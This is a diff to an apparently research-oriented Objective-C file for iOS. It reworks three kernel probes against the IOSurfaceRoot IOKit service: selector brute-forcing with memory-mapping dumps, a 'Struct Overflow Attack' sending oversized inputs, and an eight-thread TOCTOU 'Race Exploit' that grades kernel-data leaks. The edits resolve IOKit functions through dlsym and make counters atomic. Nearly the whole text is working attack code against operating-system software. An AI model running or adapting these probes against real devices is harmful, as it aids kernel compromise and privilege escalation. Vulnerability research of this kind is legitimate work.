@@ -15223,18 +15223,17 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
         log(@"IOKBRUTE: === Probe 70: IOKit Selector Brute Force ===");
         log(@"IOKBRUTE: Fuzzing selectors 0-199 on IOSurfaceRootUserClient");
 
-        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
-            IOServiceMatching("IOSurfaceRoot"));
+        io_service_t service = sym.getMatch(MACH_PORT_NULL, sym.matching("IOSurfaceRoot"));
         io_connect_t conn = 0;
         kern_return_t kr = 0;
 
-        if (service == IO_OBJECT_NULL) {
+        if (service == 0) {
             log(@"IOKBRUTE: FAIL — IOSurfaceRoot service not found");
         }
 
-        if (service != IO_OBJECT_NULL && !isr_stopped()) {
-            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
-            IOObjectRelease(service);
+        if (service != 0 && !isr_stopped()) {
+            kr = sym.open(service, mach_task_self(), 0, &conn);
+            sym.release(service);
             log([NSString stringWithFormat:@"IOKBRUTE: IOServiceOpen kr=%d conn=%u", kr, conn]);
 
             if (kr != KERN_SUCCESS) {
@@ -15261,13 +15260,13 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                     size_t structOutSize = 4096;
                     uint8_t structOut[4096] = {0};
 
-                    kr = IOConnectCallMethod(conn, sel,
+                    kr = sym.call(conn, sel,
                         NULL, 0, NULL, 0,
                         scalarOut, &scalarOutCnt,
                         structOut, &structOutSize);
                     crashSurvived++;
 
-                    if (kr != 0xe00002c2 && kr != 0xe00002bc) { // not KERN_INVALID_ARGUMENT / MIG_BAD_ID
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc) {
                         acceptCount++;
                         log([NSString stringWithFormat:@"IOKBRUTE: sel=%u no-input kr=0x%x outScalar=%u outStruct=%zu",
                              sel, kr, scalarOutCnt, structOutSize]);
@@ -15298,7 +15297,7 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                         memset(structOut, 0, sizeof(structOut));
                         structOutSize = 4096;
 
-                        kr = IOConnectCallMethod(conn, sel,
+                        kr = sym.call(conn, sel,
                             scalarIn, 1, NULL, 0,
                             scalarOut, &scalarOutCnt,
                             structOut, &structOutSize);
@@ -15323,7 +15322,7 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                         memset(structOut, 0, sizeof(structOut));
                         structOutSize = 4096;
 
-                        kr = IOConnectCallMethod(conn, sel,
+                        kr = sym.call(conn, sel,
                             NULL, 0, structIn, 64,
                             scalarOut, &scalarOutCnt,
                             structOut, &structOutSize);
@@ -15344,33 +15343,40 @@ void iosurface_research_iokit_brute(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonn
                 // Phase 2: IOConnectMapMemory types 0-15
                 if (!isr_stopped()) {
                     log(@"IOKBRUTE: Phase 2 — IOConnectMapMemory types 0-15");
-                    for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
-                        mach_vm_address_t addr = 0;
-                        mach_vm_size_t size = 0;
-                        kr = IOConnectMapMemory64(conn, memType, mach_task_self(),
-                            &addr, &size, kIOMapAnywhere);
-                        if (kr == KERN_SUCCESS) {
-                            mapCount++;
-                            log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u SUCCEEDED addr=0x%llx size=%llu",
-                                 memType, (uint64_t)addr, (uint64_t)size]);
-                            // Read first 64 bytes
-                            if (size > 0 && addr != 0) {
-                                uint8_t *mapped = (uint8_t *)(uintptr_t)addr;
-                                NSMutableString *hex = [NSMutableString new];
-                                for (int i = 0; i < 64 && i < (int)size; i++) {
-                                    [hex appendFormat:@"%02x", mapped[i]];
+                    typedef kern_return_t (*MapMem64Fn)(io_connect_t, uint32_t, task_t, mach_vm_address_t *, mach_vm_size_t *, uint32_t);
+                    typedef kern_return_t (*UnmapMem64Fn)(io_connect_t, uint32_t, task_t, mach_vm_address_t);
+                    MapMem64Fn mapMem = (MapMem64Fn)dlsym(sym.iokit, "IOConnectMapMemory64");
+                    UnmapMem64Fn unmapMem = (UnmapMem64Fn)dlsym(sym.iokit, "IOConnectUnmapMemory64");
+                    uint32_t kMapAnywhere = 1;
+                    if (mapMem && unmapMem) {
+                        for (uint32_t memType = 0; memType < 16 && !isr_stopped(); memType++) {
+                            mach_vm_address_t addr = 0;
+                            mach_vm_size_t size = 0;
+                            kr = mapMem(conn, memType, mach_task_self(), &addr, &size, kMapAnywhere);
+                            if (kr == KERN_SUCCESS) {
+                                mapCount++;
+                                log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u SUCCEEDED addr=0x%llx size=%llu",
+                                     memType, (uint64_t)addr, (uint64_t)size]);
+                                if (size > 0 && addr != 0) {
+                                    uint8_t *mapped = (uint8_t *)(uintptr_t)addr;
+                                    NSMutableString *hex = [NSMutableString new];
+                                    for (int i = 0; i < 64 && i < (int)size; i++) {
+                                        [hex appendFormat:@"%02x", mapped[i]];
+                                    }
+                                    log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u data=%@", memType, hex]);
                                 }
-                                log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u data=%@", memType, hex]);
+                                unmapMem(conn, memType, mach_task_self(), addr);
+                            } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                                log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u kr=0x%x", memType, kr]);
                             }
-                            IOConnectUnmapMemory64(conn, memType, mach_task_self(), addr);
-                        } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
-                            log([NSString stringWithFormat:@"IOKBRUTE: MapMemory type=%u kr=0x%x", memType, kr]);
                         }
+                    } else {
+                        log(@"IOKBRUTE: MapMemory symbols not available");
                     }
                 }
 
                 if (surf) CFRelease(surf);
-                IOServiceClose(conn);
+                sym.close(conn);
             } // end conn success
         } // end service found
 
@@ -15418,18 +15424,17 @@ void iosurface_research_struct_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
         log(@"STRUCTOVF: === Probe 71: Struct Overflow Attack ===");
         log(@"STRUCTOVF: Sending oversized structs to selectors 0-20");
 
-        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
-            IOServiceMatching("IOSurfaceRoot"));
+        io_service_t service = sym.getMatch(MACH_PORT_NULL, sym.matching("IOSurfaceRoot"));
         io_connect_t conn = 0;
         kern_return_t kr = 0;
 
-        if (service == IO_OBJECT_NULL) {
+        if (service == 0) {
             log(@"STRUCTOVF: FAIL — IOSurfaceRoot service not found");
         }
 
-        if (service != IO_OBJECT_NULL && !isr_stopped()) {
-            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
-            IOObjectRelease(service);
+        if (service != 0 && !isr_stopped()) {
+            kr = sym.open(service, mach_task_self(), 0, &conn);
+            sym.release(service);
 
             if (kr != KERN_SUCCESS) {
                 log([NSString stringWithFormat:@"STRUCTOVF: FAIL — IOServiceOpen kr=%d", kr]);
@@ -15465,7 +15470,7 @@ void iosurface_research_struct_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                         uint64_t scalarOut[16] = {0};
                         uint32_t scalarOutCnt = 16;
 
-                        kr = IOConnectCallMethod(conn, sel,
+                        kr = sym.call(conn, sel,
                             NULL, 0, structIn, sz,
                             scalarOut, &scalarOutCnt,
                             structOut, &structOutSize);
@@ -15518,7 +15523,7 @@ void iosurface_research_struct_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                         uint64_t scalarOut2[16] = {0};
                         uint32_t scalarOut2Cnt = 16;
 
-                        kr = IOConnectCallMethod(conn, sel,
+                        kr = sym.call(conn, sel,
                             fakeScalar, 8, NULL, 0,
                             scalarOut2, &scalarOut2Cnt,
                             structOut2, &structOut2Size);
@@ -15537,7 +15542,7 @@ void iosurface_research_struct_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
                 } // end selector loop
 
                 if (surf) CFRelease(surf);
-                IOServiceClose(conn);
+                sym.close(conn);
             }
         }
 
@@ -15573,27 +15578,26 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
         isr_load(&sym);
         CFTimeInterval t0 = CACurrentMediaTime();
 
-        __block int staleAccess = 0;
-        __block int unexpectedData = 0;
-        __block int raceHits = 0;
+        __block atomic_int staleAccess = 0;
+        __block atomic_int unexpectedData = 0;
+        __block atomic_int raceHits = 0;
         __block int iterations = 0;
         NSString *verdict = @"PENDING";
 
         log(@"RACEEXPL: === Probe 72: Race Exploit (TOCTOU) ===");
         log(@"RACEEXPL: 8 threads, 200 iterations, IOConnectCallMethod + create/destroy race");
 
-        io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
-            IOServiceMatching("IOSurfaceRoot"));
+        io_service_t service = sym.getMatch(MACH_PORT_NULL, sym.matching("IOSurfaceRoot"));
         io_connect_t conn = 0;
         kern_return_t kr = 0;
 
-        if (service == IO_OBJECT_NULL) {
+        if (service == 0) {
             log(@"RACEEXPL: FAIL — IOSurfaceRoot service not found");
         }
 
-        if (service != IO_OBJECT_NULL && !isr_stopped()) {
-            kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
-            IOObjectRelease(service);
+        if (service != 0 && !isr_stopped()) {
+            kr = sym.open(service, mach_task_self(), 0, &conn);
+            sym.release(service);
 
             if (kr != KERN_SUCCESS) {
                 log([NSString stringWithFormat:@"RACEEXPL: FAIL — IOServiceOpen kr=%d", kr]);
@@ -15640,7 +15644,7 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
                                 uint8_t structOut[256] = {0};
                                 size_t structOutSize = 256;
 
-                                kern_return_t rkr = IOConnectCallMethod(conn, sel,
+                                kern_return_t rkr = sym.call(conn, sel,
                                     NULL, 0, structIn, 32,
                                     scalarOut, &scalarOutCnt,
                                     structOut, &structOutSize);
@@ -15648,12 +15652,11 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
                                 // Check if we're using a destroyed surface's ID
                                 if (destroying && idx < destroyIdx) {
                                     if (rkr == KERN_SUCCESS || rkr == 0) {
-                                        OSAtomicIncrement32(&raceHits);
+                                        atomic_fetch_add_explicit(&raceHits, 1, memory_order_relaxed);
                                     }
-                                    // Check for unexpected data in output
                                     for (int i = 0; i < 4; i++) {
                                         if (scalarOut[i] != 0) {
-                                            OSAtomicIncrement32(&unexpectedData);
+                                            atomic_fetch_add_explicit(&unexpectedData, 1, memory_order_relaxed);
                                             break;
                                         }
                                     }
@@ -15684,7 +15687,7 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
                                     // Check if we got a recycled ID
                                     for (NSNumber *oldID in surfIDs) {
                                         if (newID == oldID.unsignedIntValue) {
-                                            OSAtomicIncrement32(&staleAccess);
+                                            atomic_fetch_add_explicit(&staleAccess, 1, memory_order_relaxed);
                                             break;
                                         }
                                     }
@@ -15698,33 +15701,37 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
 
                     if (iter % 50 == 49) {
                         log([NSString stringWithFormat:@"RACEEXPL: iter %d/200 — raceHits=%d staleAccess=%d unexpectedData=%d",
-                             iter + 1, raceHits, staleAccess, unexpectedData]);
+                             iter + 1, atomic_load(&raceHits), atomic_load(&staleAccess), atomic_load(&unexpectedData)]);
                     }
                 } // end iterations
 
-                IOServiceClose(conn);
+                sym.close(conn);
             }
         }
 
         CFTimeInterval elapsed = CACurrentMediaTime() - t0;
+        int finalRaceHits = atomic_load(&raceHits);
+        int finalStaleAccess = atomic_load(&staleAccess);
+        int finalUnexpectedData = atomic_load(&unexpectedData);
+
         log([NSString stringWithFormat:@"RACEEXPL: Completed %d iterations in %.2fs", iterations, elapsed]);
         log([NSString stringWithFormat:@"RACEEXPL: raceHits=%d staleAccess=%d unexpectedData=%d",
-             raceHits, staleAccess, unexpectedData]);
+             finalRaceHits, finalStaleAccess, finalUnexpectedData]);
 
-        if (unexpectedData > 0 && raceHits > 0) verdict = @"CRITICAL — race condition leaks kernel data via stale selector";
-        else if (raceHits > 5) verdict = @"HIGH — multiple TOCTOU race hits on destroyed surfaces";
-        else if (staleAccess > 0 && raceHits > 0) verdict = @"HIGH — stale ID reuse + selector race confirmed";
-        else if (staleAccess > 0) verdict = @"MEDIUM — ID recycling during race detected";
-        else if (raceHits > 0) verdict = @"MEDIUM — selector accepted destroyed surface input";
+        if (finalUnexpectedData > 0 && finalRaceHits > 0) verdict = @"CRITICAL — race condition leaks kernel data via stale selector";
+        else if (finalRaceHits > 5) verdict = @"HIGH — multiple TOCTOU race hits on destroyed surfaces";
+        else if (finalStaleAccess > 0 && finalRaceHits > 0) verdict = @"HIGH — stale ID reuse + selector race confirmed";
+        else if (finalStaleAccess > 0) verdict = @"MEDIUM — ID recycling during race detected";
+        else if (finalRaceHits > 0) verdict = @"MEDIUM — selector accepted destroyed surface input";
         else verdict = @"LOW — no race condition exploitable";
         log([NSString stringWithFormat:@"RACEEXPL: VERDICT: %@", verdict]);
 
         NSDictionary *res = @{
             @"status": isr_stopped() ? @"STOPPED" : @"DONE",
             @"iterations": @(iterations),
-            @"raceHits": @(raceHits),
-            @"staleAccess": @(staleAccess),
-            @"unexpectedData": @(unexpectedData),
+            @"raceHits": @(finalRaceHits),
+            @"staleAccess": @(finalStaleAccess),
+            @"unexpectedData": @(finalUnexpectedData),
             @"verdict": verdict,
             @"elapsed": @(elapsed)
         };
